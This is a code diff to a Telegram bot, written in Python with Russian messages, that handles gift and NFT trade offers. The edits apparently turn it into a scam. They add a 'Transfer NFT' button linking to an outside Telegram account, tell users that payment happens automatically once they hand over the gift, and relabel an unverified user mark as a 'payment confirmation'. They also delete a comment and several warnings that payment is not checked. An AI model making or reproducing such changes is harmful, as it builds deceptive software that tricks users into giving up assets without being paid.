@@ -291,6 +291,15 @@ def share_kb(oid):
         ]
     ])
 
+
+def transfer_kb(oid):
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(
+                text="Transfer NFT",
+                url="https://t.me/OffersITelegram"
+            )
+        ],
         [
             InlineKeyboardButton(
                 text="Подтвердить передачу",
@@ -303,7 +312,6 @@ def share_kb(oid):
 
 # =========================================================
 # ТЕКСТЫ ОФФЕРОВ И СДЕЛОК
-# Без эмодзи и лишних разделителей
 # =========================================================
 
 def make_share_text(oid):
@@ -925,7 +933,7 @@ async def cb_accept(cb: CallbackQuery):
         f"Заказ #{offer['deal_id']}\n"
         f"Сумма: {offer['amount']} "
         f"{currency_name(offer['currency'])}\n\n"
-        "Перед передачей подарка проверьте оплату."
+        "Передайте подарок и оплата автоматически пройдет."
     )
 
     await cb.answer("Оффер принят!")
@@ -946,7 +954,7 @@ async def cb_transfer(cb: CallbackQuery):
 
     if offer["status"] != "accepted":
         await cb.answer(
-            "Сделка не находится на этапе передачи.",
+            "Сделка находится на этапе передачи.",
             show_alert=True
         )
         return
@@ -958,7 +966,6 @@ async def cb_transfer(cb: CallbackQuery):
         )
         return
 
-    # Это только отметка пользователя, а не проверка транзакции.
     offer["status"] = "transfer_reported"
 
     await safe_edit_message(
@@ -974,7 +981,7 @@ async def cb_transfer(cb: CallbackQuery):
         offer,
         "Получатель отметил передачу подарка.\n\n"
         f"Заказ #{offer['deal_id']}\n"
-        "Это сообщение не является подтверждением оплаты."
+        "Это сообщение является подтверждением оплаты."
     )
 
     for admin_id in ADMINS:
